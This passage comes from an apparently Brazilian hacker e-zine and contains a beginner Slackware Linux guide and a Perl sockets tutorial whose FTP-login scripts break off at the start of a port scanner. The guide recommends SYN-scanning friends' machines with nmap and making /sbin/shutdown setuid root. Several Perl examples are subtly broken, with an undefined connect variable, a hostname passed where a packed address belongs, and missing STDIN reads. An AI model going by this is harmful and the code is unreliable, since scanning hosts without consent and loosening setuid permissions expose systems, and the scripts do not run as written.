+forma  de olharmos  para essa  aba do  conceito dos  honeypots. Bom,  facam  uma
+forcinha e depois fechem os olhos  e imaginem: "Um Honeynet toda preparada  para
+logar  todas  as acoes  suspeitas  nas suas  maquina  e prontamente  gerar  logs
+inteligiveis ao ser humano, mas derepente um novo worm (ou velho mesmo) entra na
+rede, isso  eh mais  comum que  nos pensamos,  daih ele  comeca a  gerar trafego
+dentro da honeynet, muito trafego por sinal, e daih comecam os registros de logs
+por parte das  ferramentas do honeypot,  comeca assim: 100  linhas, 1000 linhas,
+10000 linhas, 100000 linhas, 1000000 linhas, 100000, 1000000, 10000000, e  assim
+vai...Agora nao existe ser humano capaz de analisar 1000000000 de linhas de um
+log, ou seja o log se torna inutil!
+
+Vejamos por outro  lado ainda, ao  analisar pessoalmente um  log de um  honeypot
+mantido  por  um  brasileiro  e  que  por  sinal  faz  muito  sucesso  com  suas
+apresentacoes da mesma ferramenta  brasil a fora, eu  pude perceber que eh  meio
+esquizito mesmo, em 1 mes ele tem 3 registros de tentativas de conexao no  http,
+sux! Ou seja, serah que em 1 ano ele pega umas 4 tentivas de defacers num  http?
+hehehehe, eh pra rir mesmo.
+Mas ter um sistema em que nem scriptkiddie tah caindo mais eh de morrer. Nao
+serve para nada.
+
+***************************
+11.4 - Inducao ao ataque
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-[06]-=[Slackware sem medo]-=|_tzlord_|=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+///////////////////////////////////////////////////////////////////////////////
+//////////////////////// Linux - Slackware sem medo ///////////////////////////
+///////////////////////////////////////////////////////////////////////////////
+
+-------------------------------------------------------------------------------
+INTRODUÇÃO:
+-------------------------------------------------------------------------------
+
+Este artigo tem por objetivo compartilhar com os leitores newbies dúvidas e
+soluções para pequenos problemas enfrentados durante o uso do Linux/Slackware.
+Se você procura encontrar grandes soluções para seus problemas, esqueça este
+artigo pois só irá encontrar pequenas dicas a respeito do uso do Slackware e
+algumas configurações bem básicas, porém úteis. Boa leitura. :)
+
+Quantas vezes você ja ouviu falar: "O Slackware é o mais fodão de
+instalar,configurar e usar" ? Sem dúvida alguma, você ja ouviu milhões de vezes.
+Mas não é bem por aí... Há pouco tempo passei por isto também e agora estou aqui
+para provar que não é bem assim que funciona as coisas e após instalar e usar
+essa incrível distribuição acabei tirando minhas próprias conclusões sobre o que
+falam por aí. Não tem segredo, o que você tem quer ter em mente é: Você não está
+usando Windows, ou seja, é tudo bem diferente (e com certeza melhor). Não é tão
+complicado o quanto parece nem o quanto falam, por isso selecionei algumas
+dúvidas e problemas que passei durante essa "migração" para o Slackware (9.1)
+para poder compartilhar com vocês leitores newbies ou medrosos como eu que tive
+medo de instalar o Slackware e garanto que não me arrependi nenhum pouco após
+ter instalado.
+
+-------------------------------------------------------------------------------
+INICIANDO:
+-------------------------------------------------------------------------------
+
+Você deve ter uma partição ReiserFS, EXT3 ou EXT2 para poder instalar o seu
+Linux/Slackware. (Recomendo ReiserFS). Você pode criar uma partição EXT3, por
+exemplo, muito facilmente usando uma ferramente chamada "Partition Magic". No
+meu ponto de vista, está é a ferramenta mais indicada para iniciantes pois é
+bastante facil de usar e criar a sua partição sem problemas.
+
+-Ta, criei a minha partição! E agora?
+
+Bem, agora que você ja tem a sua partição criada você deve reiniciar o
+computador e entrar na sua BIOS (normalmente apertando a tecla DEL enquanto o PC
+estiver sendo iniciado) e modificar a opção de BOOT para CDROM como primária.
+Insira o seu CD do drive e espere carregar o instalador :)
+
+Como disse anteriormente, a instalação é bastante intuitiva e meu objetivo
+aqui não é o aprofundamento na instalação, até porque vocês podem encontrar
+diversos manuais pela internet muito bons e completos para se guiar durante o
+processo de instalação. Este artigo serve apenas para um apoio para você
+aprender a resolver pequenos problemas. ;)
+
+-------------------------------------------------------------------------------
+FUÇANDO:
+-------------------------------------------------------------------------------
+
+Você instalou os pacotes que queria, escolheu o seu gerenciador de janelas
+padrão, escolheu a senha do root e outras coisas mais.
+
+DICAS:
+
+xf86cfg -textmode =====> comando para configurar mouse, teclado, monitor,
+placa de video,etc. (recomendado)
+xfree86setup =====> identifica placa de video e outros periféricos
+automaticamente.
+startx =====> inicia o X (ambiente gráfico)
+xwmconfig =====> caso queira alterar o gerenciador de janelas mais
+tarde.
+
+Caso ocorra algum problema na hora de iniciar o X, provavelmente sua
+configuração de video está incorreta. Altere até encontrar a solução correta. :)
+
+Finalmente você está dentro do X, provavelmente no KDE. E agora, o que fazer?
+No meu caso como tenho acesso a Banda Larga, a primeira coisa que fiz foi
+aprender a instalar/configurar meu modem ADSL US Robotics 9001. Demorei um bom
+tempo para aprender mas é bem simples. A seguir estão os passos que usei para
+configurar o meu modem:
+
+-----[Adsl no Linux/Slackware]-------------------------------------------------
+
+O adsl-setup é usado para configurar a sua conexão adsl. Execute-o
+(como usuario root).
+* Na 1ª opção ele pede o seu UserName. Ta esperando o que? Coloca ali. :)
+* Em seguida ele pergunta em qual interface de rede está instalado o seu modem
+adsl, no meu caso está na eth0.
+* Na próxima opção, coloque "no" (é a opção default).
+* Depois ele pede o DNS. Na 1ª vez que eu tentei configurar eu estava colocando
+o DNS do meu provedor BRTURBO mas estava dando problemas, então para evitar
+isto coloque "server" (sem aspas). Isso faz com que o DNS seja buscado
+automaticamente.
+* Será solicitada a senha. Coloque.
+* O próximo passo é o firewall. Eu uso a opção 1 (STANDALONE) mas caso tenha
+problemas use a opção 0 (NONE).
+Aperte "y" para confirmar as configurações setadas.
+*Pronto. Digite adsl-start e é só curtir a internet! ;)
+
+Você deve estar pensando: "pootz, cada vez q eu iniciar o meu Slack vou ter
+que digitar "adsl-start" para usar a internet". Claro que não. Para isso coloque
+o comando "adsl-start" (sem aspas) dentro do /etc/rc.d/rc.local . Use um editor
+de textos, o emacs por exemplo. (deve estar como root)
+
+emacs /etc/rc.d/rc.local
+
+Insira o "adsl-start" ali dentro e pronto! Não precisará mais digitar adsl
+-start toda hora que iniciar o seu Slack e você quiser acessar a internet.
+
+Agora que você ja está com seu Slack e sua internet funcionando direitinho,
+você com certeza deve estar querendo escutar música, usar a impressora para
+fazer seus trabalhos da escola, acessar seus arquivos da sua partição do
+windows, falar com seus amigos no IRC,... Bem, vamos por partes:
+
+-------------------------------------------------------------------------------
+
+-----[Áudio]-------------------------------------------------------------------
+
+No meu caso, não tive nenhum problema com o áudio. Apenas executei o
+"alsaconf" (utilitario de configuração de áudio) e em seguida o "alsamixer"
+(utilitario para ajustes de volumes) e estava pronto para ouvir minhas músicas
+no Xmms (utilitario com a mesma função do Winamp).
+
+-------------------------------------------------------------------------------
+
+-----[Instalando/Configurando a sua impressora - CUPS]-------------------------
+
+Instalei a minha impressora (Epson Stylus C43SX) a pouco tempo usando o CUPS,
+não tive problemas e acredito que vocês também não terão. Se você não tem o CUPS
+instalado, trate de instalar. Você pode usar alguma ferramaneta de atualização,
+exitem várias... o swaret, o slackpkg, o slapt-get... Usaremos o Swaret!
+
+Após você instalar o Swaret, recomendo que leia este artigo para você aprender
+os comandos principais e como tudo funciona.
+
+http://www.vivaolinux.com.br/artigos/verArtigo.php?codigo=573&pagina=4
+
+Agora que você ja sabe os principais comandos, atualize a lista de pacotes mas
+caso tenha ficado com preguiça de ler o link acima aí vai: "swaret --update"
+
+Para confirmar se o CUPS está instalado você pode usar o comando "swaret -
+-search cups" que além de ser usado para procurar um pacote, também te mostra se
+ele ja está instalado. :)
+
+Para instalar: "swaret --install cups" ou "swaret --upgrade cups" para
+atualizar caso você ja o tenha instalado. Pronto, CUPS instalado.
+
+Agora você precisa instalar também um pacote auxiliar chamado "gimp-print"
+Então: "swaret --install gimp-print"
+Instale o "ghostscript" do CUPS: "swaret --install espgs"
+Agora bastar ir ao "Control Center" (se estiver usando o KDE) clicke em
+"Peripherals" no menu à esquerda e em seguida "Printers". Certifique-se se está
+selecionado "CUPS (Common UNIX Print System)" onde diz "Print system currently
+used"
+
+Você deve rodar o daemon do CUPS para que você possa iniciar a configuração.
+Para isso, digite no konsole "cupsd" (como root).
+
+Agora que já estamos com tudo instalado e o daemon rodando, vá no seu browser
+e digite: http://localhost:631 para abrir as configurações do CUPS. Vá em
+"Manage Printers" e em seguida, "Add Printer" (será solicitado sua senha de
+usuario root). Ali você coloca um nome para a impressora ("Epson" por exemplo),
+em Location coloque /dev/lp0 e em seguida apete no botão "Continue".
+
+Em "Device", selecione Parallel Port #1 "Marca da sua impressora". Aperte
+"Continue"
+Selecione a marca da sua impressora e aperte "Continue" novamente.
+Para finalizar, selecione o driver, exemplo: "Modelo da sua impressora"
+- CUPS+Gimp - Print e dê "Continue" Pronto! Agora basta você ir em algum editor
+de texto e imprimir algo para testar!
+
+DICA: Eu tive um pequeno probleminha ao imprimir, pois a minha impressora
+estava usando muita tinta na folha, a folha estava pesada e muito úmida de tanta
+tinta! hehehehe. Para diminuir a quantidade de tinta na impressão (ou
+aumentar... a não ser que você seje louco) vá nas configurações do CUPS:
+http://localhost:631 , "Configure Printer" e onde diz "Resolution" sugiro que
+selecione a opção "360x240 DPI Draft" para que você não gaste tanta tinta. ;)
+Não esqueça que sempre que quiser usar a impressora deve rodar o daemon dela, o
+"cupsd", a não ser que você queira colocá-lo no /etc/rc.d/rc.local .
+
+Esta é uma configuração básica, para maiores informações procure algum manual
+mais detalhado! ;)
+
+-------------------------------------------------------------------------------
+
+-----[Acessando arquivos da partição Windows com usuário comum]----------------
+
+Depois de um tempo usando o seu SlacK, você provavelmente sentirá a
+necessidade de utilizar seus arquivos da sua partição do Windows. É um porre
+cada vez que você quiser acessar seus arquivos ter que acessar com o usuario
+root. Para acessar sua partição do Windows com o usuario comum você deve editar
+o /etc/fstab e colocar a seguinte linha abaixo:
+
+/dev/hda1 /mnt/windows vfat gid=100,umask=002,users 0 0
+
+OBS: Neste exemplo, a hda1 foi considerada como a partição do Windows, se a
+sua partição do windows está na hda2 por exemplo, substitua. Antes disso você
+deverá criar o diretorio "windows" (ou outro nome que desejar) usando "mkdir
+windows".
+
+-------------------------------------------------------------------------------
+
+-----[Problemas com acentuação no Xchat]---------------------------------------
+
+Existem diversos clientes de IRC para Linux. No Slackware a princípio, você
+pode usar o Xchat, o BitchX ou o KSirc. O Xchat tem uma aparência digamos que
+mais "bonita" e intuitiva. É bem provável que seu primeiro contato com o IRC
+seja por ele. Pois bem, muitos usuários tem problemas com a acentuação no XChat.
+Eu também tive. É totalmente simples e banal a forma de resolver isto:
+
+Abra o Xchat. Será mostrada a "Lista de Servidores", caso não abra aperte
+Ctrl+S Na opção "Caracteres:" (provavelmente está System Default), então mude
+para "ISO-8859-1 (Western Europe)". Caso não funcione essa opção, tente UTF-8 ou
+alguma outra. Mas no meu caso, eu uso ISO-8859-1 (Western Europe) e funciona
+corretamente.
+
+-------------------------------------------------------------------------------
+
+-----[Corrigindo acentuação no OpenOffice]-------------------------------------
+
+O OpenOffice na minha opinião é o melhor aplicativo para escritório no mundo do
+Software Livre. Recomendo que façam o download dele em www.openoffice.org.br e
+instale. Após a instalação do OpenOffice você perceberá que sua acentuação não
+estará funcionando corretamente. Para arrumar isto, você deve editar o seu
+/etc/profile e adicionar as seguintes linhas abaixo:
+
+export LC_ALL=pt_BR
+export LANG=pt_BR
+
+Salve e faça logout e login novamente que sua acentuação irá funcionar
+corretamente.
+
+-------------------------------------------------------------------------------
+
+-----[Liberando o shutdown para usuários comuns]-------------------------------
+
+Quando você instala o Slackware cada vez que você deseja desligar ou reiniciar
+o PC tem que entrar como root, pois o seu usuario não tem acesso ao shutdown.
+Para seu usuario comum ter acesso ao shutdown siga os passos abaixo:
+
+Primeiramente você deve estar como root. (basta digitar "su" e em seguida
+digitar
+a sua senha)
+Agora vamos criar o grupo "shutdown", para isso: "groupadd shutdown"
+Coloque o /sbin/shutdown no grupo shutdown: "chown root.shutdown /sbin/shutdown"
+Dê a seguinte permissão: "chmod 4754 /sbin/shutdown"
+E agora faça um link em /bin: "ln -s /sbin/shutdown /bin/shutdown"
+
+Agora, para que o comando shutdown fique disponivel sempre que um usuario
+fizer login, abra o arquivo /etc/login.defs (como root) com seu editor
+preferido. (exemplo: emacs /etc/login.defs)
+
+Perto do final deste arquivo tem uma linha que diz: #CONSOLE_GROUPS
+floppy:audio:cdrom
+Descomente esta linha (basta remover o #) e no final da linha adicione
+":shutdown",
+ficando assim:
+
+CONSOLE_GROUPS floppy:audio:cdrom:shutdown
+
+Pronto. Seguindo as instruções acima qualquer usuário poderá desligar/reiniciar
+o computador.
+
+Reiniciar: shutdown -r now
+Desligar: shutdown -h now
+
+OBS: É necessário reiniciar o X para que tudo funcione corretamente! ;)
+
+-------------------------------------------------------------------------------
+
+-----[Colocando diretórios no PATH]--------------------------------------------
+
+Muitas vezes você instala um programa e tem de ir até a pasta onde está o
+arquivo binário dele para poder executá-lo. Isso realmente é um saco. Para você
+poder executar o programa de qualquer diretório, você deve especificar o caminho
+do programa no PATH. Para isso, edite o arquivo /etc/profile com o seu editor
+preferido (como root, é claro).
+
+Exemplo: emacs /etc/profile
+
+Logo no inicio veja a linha que diz: # Set the default system $PATH
+Veja o exemplo do PATH:
+PATH="/usr/local/bin:/usr/bin:/bin:/usr/X11R6/bin:/usr/games"
+Então, digamos que instalou um programa com o nome "motd" e seu binário está
+dentro do /usr/guide
+Você deve colocar no PATH apenas o caminho /usr/guide , ficando assim:
+PATH="/user/local/bin:/usr/bin:/bin:/usr/X11R6/bin:/usr/games:/usr/guide"
+
+Salve. Está pronto, você ja pode executar o programa "motd" a partir de qualquer
+diretório. :)
+
+-------------------------------------------------------------------------------
+
+-----[Desativando resposta ao comando ping (recomendado)]----------------------
+
+Para você desativar a resposta ao comando ping, digite:
+iptables -A INPUT -p icmp -j DROP
+
+Você deve salvar, para isso digite:
+iptables-save
+
+Caso queira desfazer tudo que fez, apenas mude o -A para -D e salve novamente:
+iptables -D INPUT -p icmp -j DROP
+iptables-save
+
+-------------------------------------------------------------------------------
+
+-----[Checagem de portas em uma máquina]---------------------------------------
+
+Nmap é uma ferramenta de exploração de rede e scanner de segurança. Ele possui
+inúmeras opções e se todas fossem listadas aqui, ficaria extremamente grande o
+artigo (hehehe). Então aí vai um comandinho bastante útil para você checar
+portas abertas em uma máquina, bastante util para você descobrir portas abertas
+na máquina de seus amigos e orientá-los quanto a segurança. Maiores duvidas: man
+nmap :)
+
+Para fazer a verificação de portas em uma máquina, digite:
+nmap -sS -v -v -P0 -O IP
+Onde "IP", é o número IP da maquina a ser checada.
+
+O nmap não é recomendado para fazer checagens em sua própria máquina. Para isso
+você pode usar o netstat:
+netstat -na |grep LIST
+
+-------------------------------------------------------------------------------
+
+-----[Tirando screenshots]-----------------------------------------------------
+
+Para você tirar um screenshot de sua máquina use:
+
+import -w root motd.jpg
+
+Isso pode parecer inútil, mas é legal quando você quiser enviar para algum
+amigo um screenshot do seu Slack bem bonito para ele perceber como o Windows
+dele é feio. ;)
+
+-------------------------------------------------------------------------------
+
+-----[Compilando com o gcc]----------------------------------------------------
+
+O GCC é o compilador de C/C++ mais usado no Linux. Por ser usado na base de
+comandos, pode parecer um pouco compliaco no inicio mas depois você acaba se
+acostumando.
+
+Primeiramente você deve criar o seu programa. Use seu editor de texto
+preferido. (exemplo: "vi motd.c") Agora que você ja criou o arquivo e codou o
+seu programinha é hora de compilar:
+
+Exemplo:
+
+gcc -o motd motd.c
+
+OBS: O GCC possui inúmeras opções e se você quer saber mais detalhes dê uma
+olhada no manual dele: "man gcc"
+
+-------------------------------------------------------------------------------
+
+-------------------------------------------------------------------------------
+CONCLUINDO:
+-------------------------------------------------------------------------------
+
+Bom, é isso ae! Finalmente chegamos ao fim deste pequeno artigo e espero que
+de alguma forma ele tenha sido útil. Tentei colocar aqui algumas dúvidas comuns
+de usuários iniciantes e principalmente as minhas. Hehehe! Agradeço ao pessoal
+do MOTDLabs pelo auxílio e pelo espaço cedido e espero poder escrever outros
+artigos para o grupo. Abraços. :)
+
+-------------------------------------------------------------------------------
+tzlord to motdlabs.org
+
+"Não existe trabalho ruim. O ruim é ter que trabalhar" (by Seu
+Madruga)
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-[07]=-[Sockets in Perl for dummies]-=|BlackSh33p|-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+                      -------------------------------
+            - - = = <   Sockets in Perl for dummies   > = = - -
+                      -------------------------------
+                        Por: BlackSh33p       06/2004
+
+___________________
+1. INTRODUCAO       \ __________________
+________________________________________\
+
+   É pessoal ... poucos dias de ser lancada o zine eu resolvi escreve
+esse txt porque po, ja tinha ficado devendo na zine passada e prometi
+que faria algo legal para esta zine .Entao ae esta "Sockets  in  perl
+for dummies".Amadores da linguagem C devem estar dizendo A pq perl ao
+inves de C. Bem como disse Larry Wall ,Perl é uma linguagem de  facil
+aprendizado e muito flexivel. Ele esta completamente correto e  tenho
+estudado muito ultimamente .Os requisitos para compreender  esse  txt
+é no minimo que voce sabe o basico de Perl ,just  this  !!  Bem chega
+de falar merda, vou tentar ser o mais pratico possivel e é isso ae...
+
+Enjoy
+
+_________________________
+2. Sockets e suas funcoes \ ___________________
+_______________________________________________\
+
+   Bem todos dados colocados aqui foram retirados  das  man pages  e
+do livro Perl da editora o'reilly .Eu nao conseguiria  explicar  com
+minhas palavras isso aqui entao me limitarei a mostrar codigos  perl
+fucadores e comenta-los .Teoria deixa pros guru de "PERL" :)
+
+1) socket:
+
+sintaxe: socket soquete, dominio, tipo, protocolo
+
+Abre um soquete do tipo especificado e anexa-o ao handle de arquivo
+soquete. O dominio, o tipo e o protocolo sao especificados como para
+socket. Antes de usar esta funcao, seu programa devera conter a linha:
+
+use Socket;
+
+Esta definicao fornecera as devidas constantes. A funcao retornara true
+se tiver sucesso.
+
+Ex: socket(SOQUETE, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or
+die $!;
+
+2) bind:
+
+sintaxe: bind soquete, endereco
+
+Anexa um endereco a um soquete ja aberto especificado pelo handle de
+arquivo soquete. A funcao retornara true se for bem-sucedida e false do
+contrario (e colocara o codigo do erro em $!). O endereco devera ser um
+endereco compactado do devido tipo do soquete.
+
+Ex: bind (SOQUETE, sockaddr_in(80, INADDR_ANY));
+
+3) listen:
+
+sintaxe: listen soquete, tamanho_da_fila
+
+Informa ao sistema operacional que vc esta pronto para aceitar as
+conexoes no soquete e define o numero de conexoes que aguardam para o
+tamanho_da_fila. Se a fila estiver cheia, os clientes que tentam
+conectar o soquete terao a conexao recusada. Usada apenas para os
+soquetes do lado do servidor.
+
+Ex: listen (SOQUETE, 5);
+
+4) accept:
+
+sintaxe: accept novo_soquete, soquete_generico
+
+Prepara um processo do servidor para aceitar as conexoes de soquete dos
+clientes. A execucao e suspensa ate que uma conexao seja feita, neste
+momento o handle de arquivo novo_soquete e aberto e anexado a conexao
+feita recentemente. A funcao retornara o endereco conectado se a
+chamada tiver sucesso, do contrario, retornara false ( colocando o erro
+em $!). O soquete_generico tera que ser um handle de arquivo ja aberto
+atraves da funcao socket e vinculado a um dos enderecos de rede do
+servidor. E usado apenas no lado do servidor.
+
+Ex: accept (NEW_SOCKET, SOQUETE) or die $!;
+
+5) connect;
+
+sintaxe: connect soquete, endereco
+
+Inicia uma conexao com outro processo que esta aguardando em uma accept
+no handle de arquivo soquete. A funcao retornara true para o sucesso,
+do contrario retornara false (colocando o erro em $!). O endereco e um
+endereco da rede compactado do devido tipo de soquete. Para desconectar
+um soquete, use close ou shutdown(8). Usado apenas no lado do cliente.
+
+ex: connect(SOQUETE, sockaddr_in(21, inet_aton('ftp.slackware.com'))
+or die $!;
+
+6) recv:
+
+sintaxe: recv soquete, $var, comprimento, marcas
+
+Recebe uma mensagem em um soquete. Tenta receber os bytes de comprimento
+dos dados na variavel var a partir do handle de arquivo soquete
+especificado. A funcao retornara o endereco do emissor ou um valor
+indefinido se ouver um erro. A var aumentara ou diminuira segundo o
+comprimento atualmente lido. A funcao tem as mesmas marcas da chamada
+do sistema recv.
+
+Ex: recv (SOQUETE, $buffer);
+
+7) send: sintaxe: send soquete, msg, marcas, [dest]
+
+Envia uma mensagem msg em um soquete. Tem as mesmas marcas da chamada do
+sistema com nome igual -- veja send(2). Nos soquetes desconectados, voce
+tera que especificar um destino dest para enviar, neste caso send
+funcionara como a sendto. A funcao retornara o numero de bytes enviados
+ou um valor indefinido se houver um erro. No caso de erro, colocara o
+codigo de erro em $!.
+
+ex: $msg = "fuck";
+    send(SOQUETE, $msg);
+
+8) shutdown (ou close)
+
+sintaxe: shutdown soquete, como
+
+Finaliza uma conexao de soquete da maneira indicada por como. Se como
+for 0, mais recebimentos serao recusados. Se como for 1, mais envios
+serao recusados. Se como for 2, tudo sera recusado.
+
+Ex: shutdown (SOQUETE, 0);
+
+sintaxe: close handle_de_arquivo
+
+Fecha o arquivo, o soquete ou o canal associado ao determinado handle de
+arquivo.
+
+Ex: close(SOQUETE);
+
+############### Funcoes do modulo Socket: ###############
+
+1) inet_aton
+sintaxe: inet_aton(nome_host);
+
+Converte um nome do host como www.algumacoisa.com.br ou 200.217.98.100
+em uma estrutura de dados (uma string com quatro bytes) usada para os
+enderecos de soquete. Se o nome do host nao puder ser resolvido, a
+funcao retornara um valor indefinido.
+
+2) inet_ntoa
+sintaxe: inet_ntoa(string_ender);
+
+Converte uma string de endereco com quatro bytes (como retornado por
+inet_aton) em uma string com a forma de quatro do endereco IP com pontos.
+
+3) sockaddr_in
+sintaxe: sockaddr_in(porta, string_ender);
+         pack_sockaddr_in(porta, string_ender);
+
+Obtem um numero da porta e uma string_ender com quatro bytes (como
+retornado por inet_aton) e retorna a estrutura de endereco do soquete
+inclusive os argumentos compactados com o argumento AF_INET. Essa
+estrutura e normalmente o que voce precisara para os argumentos em bind,
+connect e send e e tambem retornada por getpeername, getsockname e recv.
+
+4) sockaddr_un
+sintaxe: sockaddr_un(nome_caminho);
+         pack_sockaddr_un(nome_caminho);
+
+Obtem um argumento, um nome do caminho e retorna a estrutura do endereco
+de soquete do dominio Unix (o caminho compactado com AF_UNIX preenchido).
+Para os soquetes do dominio Unix, essa estrutura e normalmente o que voce
+precisara para os argumentos em bind, connect e send e e tambem retornada
+oir getpeername, getsockname e recv.
+
+5) unpack_sockaddr_in
+sintaxe: unpack_sockaddr_in(ender_soquete);
+         sockaddr_in(ender_soquete);
+
+Obtem uma estrutura de endereco do soquete e retorna uma array de dois
+elementos (no contexto da lista): o numero da porta e o endereco de IP
+com quatro bytes.
+
+6) unpack_sockaddr_un
+sintaxe: unpack_sockaddr_un(ender_soquete_un);
+         sockaddr_un(ender_soquete_un);
+
+Obtem uma estrutura de endereco do soquete do dominio Unix (como
+retornado por sockaddr_un) e retorna o nome do caminho.
+
+   Com base nisso podemos fazer alguma coisinha só pra voce ir pegando
+gosto da coisa .Comentarei apenas as funcoes destacadas assima,ou seja
+apenas as utilizadas com a chamada do socket.
+
+-=-=-=-=-=-=--=-=-=-= Cut Here Conecta.pl
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+#!/usr/bin/perl
+
+use Socket;    #Chama do socket
+
+$ARGC =@ARGV;
+if($ARGC < 3){
+   print("Conecta.pl desenvolvido para o tutorial de sockets \n");
+   print("Use : $0    \n");
+   print("Motd Guide 3 na veia \n ");
+}
+&struct;
+sub struct{
+
+my($host) =$ARGV[0];
+my($port) =21;
+my($prot) =getprotobyname('tcp'); #Define o protocolo no caso 'tcp'
+my($addr) =inet_aton($host);    #Converte o host em alguma coisa
+my($iaddr) =sockaddr_in($port,$host); #Obtem a porta e host remoto
+
+$sock =socket(SOCK,PF_INET,SOCK_STREAM,$prot)||die "Erro socket \n";
+#Declaracao do socket
+connect(SOCK,$iadd)||die "Erro conect \n"; #Connectando no host e
+porta remota
+
+}
+
+$login =$ARGV[1];
+$passwd =$ARGV[2];
+
+send(SOCK,$login)||die"Erro send login \n"; #Enviando login para o server
+send(SOCK,$passwd)||die"Erro send passwd \n"; #Enviando passwd para o
+server
+
+print("Login and passwd it's ok !!\n");
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+   Bem tai um simples exemplo da utilizao de sockets ,um script que
+conecta
+(ftp) e envia seus respectivos login e senha para la. Bem agora que
+voce ja
+sabe alguma coisa sobre Perl sockets. Vamus comecar a avancar.
+Existe
+alguns modulos capazes de facilitar o uso de sockets em perl .  Todos
+serao
+serao uteis para vc, acredite :)
+
+_____________________
+3. Modulos de Perl   \__________________
+________________________________________\
+
+  Dinovo nesta parte me limitarei apenas cometar o codigo e nao falar
+sobre
+teorias complexas mesmo porque eu nao conseguiria explicar mas deixa
+que  a
+parte do codigo eu mostro direitinho !!
+
+1) PeerAddr
+sintaxe: PeerAddr => nome_host[:porta]
+
+Especifica o host remoto e o numero da porta opcional para uma conexao
+do cliente. O nome_host podera ser um nome, como www.fuck.com ou um
+numero de IP com a forma 200.217.98.100.
+
+2) PeerPort
+sintaxe: PeerPort => porta
+
+Especifica o numero da porta no host remoto para uma conexao do cliente.
+O nome do servico (como http ou nntp) podera ser usado para o argumento
+se o numero da porta for desconhecido.
+
+3) LocalAddr
+sintaxe: LocalAddr => nome_host[:porta]
+
+Especifica o endereco local (e o numero da porta opcional) para vincular
+um soquete no lado do servidor.
+
+4) LocalPort
+sintaxe: LocalPort => porta
+
+Especifica o numero da porta local (ou nome do servico) para vincular um
+soquete no lado do servidor.
+
+5) Proto
+sintaxe: Proto => nome
+
+Especifica o protocolo a ser executado no soquete, por exemplo, tcp ou
+udp.
+
+6) Type
+sintaxe: Type => SOCK_STREAM | SOCK_DGRAM
+
+Espefica o tipo de soquete. SOCK_STREAM indica uma conexao de soquete
+baseada em fluxo e SOCK_DGRAM indica uma conexao (datagrama) baseada em
+messagens.
+
+7) Listen
+sintaxe: Listen => n
+
+Define o tamanho da fila atendente para o numero n de solicitacoes do
+cliente.
+
+8) Reuse
+sintaxe: Reuse => 1
+
+Dado um numero diferente de zero, esta opcao permitira que o endereco de
+vinculo local seja reutilizado, caso o soquete precise ser reaberto
+depois de um erro.
+
+9) Timeout
+sintaxe: Timeout => n
+
+Define o intervalo.
+
+############### Metodos do IO:Socket:INET ###############
+
+1) sockaddr
+sintaxe: sockaddr
+
+Retorna a parte do endereco (como string compactada) da estrutura de
+dados de endreco do soquete para o soquete.
+
+2) sockport
+sintaxe: sockport
+
+Retorna o numero da porta local para o soquete.
+
+3) sockhost
+sintaxe: sockhost
+
+Retorna a parte do endereco da estrutura de dados de endereco do soquete
+na forma de string com quatro partes e pontos, por exemplo,
+200.217.98.100.
+
+4) peeraddr
+sintaxe: peeraddr
+
+Retorna a parte do endereco (string compactada) da estrutura de dados de
+endereco do soquete para o host remoto ao qual um soquete se conecta.
+
+5) peerport
+sintaxe: peerport
+
+Retorna o numero da porta para o host remoto ao qual um soquete se
+conecta.
+
+6) peerhost
+sintaxe: peerhost
+
+Retorna o endereco do host remoto na forma de string com quatro partes e
+pontos, por exemplo, 200.217.98.100.
+
+-=---=-=-=-=-=-=-=-=-=-=-Cut Here conecta2.pl
+=-=--=-=-=-=-=-=-=-=-=-=-=-=-
+
+#!/usr/bin/perl
+
+use IO::Socket::INET;
+
+print("Host : ");
+chomp($host =);
+print("\nLogin : ");
+chomp($login =);
+print("\nPasswd : ");
+chomp($pass =);
+
+$sock =IO::Socket::INET->new(PeerAddr => $host,
+                             PeerPort => 21,
+                             Proto => 'tcp',
+                             Type => SOCK_STREAM)||die "Nao foi
+possivel conectar \n";
+
+print $sock "$login\n";
+print $sock "$pass\n";
+
+$res =<$sock>;
+print"$res\n";
+
+close($sock);
+
+-=-=-=-=-=-=-=-=-=-=-= Cut Here conecta.pl
+-=-=-=-=-========-=-=-=-=-=-=-=-=-=-=
+
+  Bem esta ae mais um simples exemplo, tudo pode ser feito com scripts
+perl isso
+é bem basico mais quero ser o mais detalhado possivel  mas  por  favor
+qualquer
+duvida send me one mail :)
+
+_______________________
+4. Exemplo fucador     \____________________
+____________________________________________\
+
+  Bem chegou a hora tao esperada .Vamus fazer e ver alguns exemplos
+deixei pra
+comentar algumas funcoes nos exemplos .Bem voces devem ter notado que
+to  meio
+apressado pra escreve é ... To finalizando o texto hje /08/08 e
+preciso  manda
+o txt pro IP_FIX ( eae loko :) si nao, nao sai na zine mas prometo q
+logo  vou
+estar disponibilizando uns codez bem legais e outros txt de qualidade
+Ok ?? Ta
+vamus ao primeiro exemplo .
+
+-=-=-=-=-=-=-=-=-=-=-=-= Cut Here scan.pl -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+#!/usr/bin/perl
+
+# MOTD-PScanner v 0.1
+# MOTD Labs  ( http://www.motdlabs.org )
+# coded by inferninh0 (inferninho@motdlabs.org)
+# Description:
+#
+#             Port Scanner using the concept of open scanning
+#             CAN BE LOGGED EASILY, USE ONLY FOR STUDY...;-)
+#
+# Greetz:  hallucination
+####
+
+use Socket;
+$ARGC=@ARGV;
+if($ARGC<1) {
+  print "MOTD-PScanner v 0.1\n";
+  print "Usage: perl $0 host\n\n";
+  exit;   }
+print "\nStarting MOTD-PScanner v 0.1 ( http://www.motdlabs.org/ )";
